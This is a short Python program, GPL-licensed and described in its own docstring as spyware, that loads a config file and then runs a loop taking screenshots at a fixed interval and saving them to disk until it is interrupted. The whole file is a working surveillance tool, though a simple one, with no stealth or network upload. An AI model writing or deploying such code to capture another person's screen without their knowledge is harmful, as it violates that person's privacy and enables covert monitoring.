#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement a SpyWare to capture screen. """

###################
#    This file implement a SpyWare to capture screen.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__all__ = ["Daemon", "main", "config_load"]

from os import path, makedirs, environ
from configparser import ConfigParser
from pyautogui import screenshot
from time import sleep
from glob import glob
from enum import Enum
from sys import argv


def config_load() -> None:

    """ This function load the config file. """

    global Constantes

    CONFIG = ConfigParser()
    env_conf_file = environ.get("screenSpy.conf")

    if len(argv) == 2:
        CONFIG.read(argv[1])
    elif env_conf_file:
        CONFIG.read(env_conf_file)
    else:
        CONFIG.read(path.join(path.dirname(__file__), "screenSpy.conf"))


    class Constantes(Enum):

        save_filename: str = CONFIG["SAVE"]["filename"]
        save_dirname: str = CONFIG["SAVE"]["dirname"]
        timeBetweenScreenshot: float = CONFIG.getfloat("TIME", "screenshotSleep")


class Daemon:

    """ This class implement a loop to capture screen for ever. """

    def __init__(self):
        self.time = Constantes.timeBetweenScreenshot.value
        self.run = True
        self.path = path.join(
            Constantes.save_dirname.value, Constantes.save_filename.value
        )
        self.increment = len(glob(self.path))

    def run_for_ever(self) -> None:

        """ This function make screenshot and sleep for ever. """

        makedirs(Constantes.save_dirname.value, exist_ok=True)
        while self.run:
            screenshot(self.path.replace("*", str(self.increment)))
            self.increment += 1
            if self.run:
                sleep(self.time)


def main() -> None:
    config_load()

    daemon = Daemon()
    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False


if __name__ == "__main__":
    main()
